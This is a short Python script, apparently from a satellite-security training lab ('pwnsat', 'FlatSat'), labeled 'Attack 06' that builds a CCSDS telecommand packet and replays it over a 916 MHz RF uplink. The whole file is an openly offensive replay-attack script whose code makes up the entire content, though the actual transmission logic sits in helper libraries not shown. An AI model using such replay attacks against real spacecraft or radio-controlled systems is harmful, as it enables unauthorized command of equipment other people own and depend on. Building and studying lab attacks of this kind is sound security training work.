#!/usr/bin/env python3
"""
Attack 06: Telecommand Replay (RF Variant via Radio 1 RF Uplink)
Re-transmits captured uplink RF frame on 916 MHz over-the-air.
"""
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from pwnsat_packets import build_ccsds_packet
from pwnsat_rf import FlatSatRF

def main():
    print("[+] Attack 06: Telecommand Replay Attack (Over-The-Air RF 916 MHz Variant)")
    rf = FlatSatRF()
    packet = build_ccsds_packet(apid=0x01, payload=b"\x10\x00")
    print("[*] Replaying captured RF payload over 916.0 MHz uplink...")
    rf.transmit_rf(packet)
    print("[✓] RF Replay frame transmitted. NeoPixel LED set to Blue.")

if __name__ == "__main__":
    main()
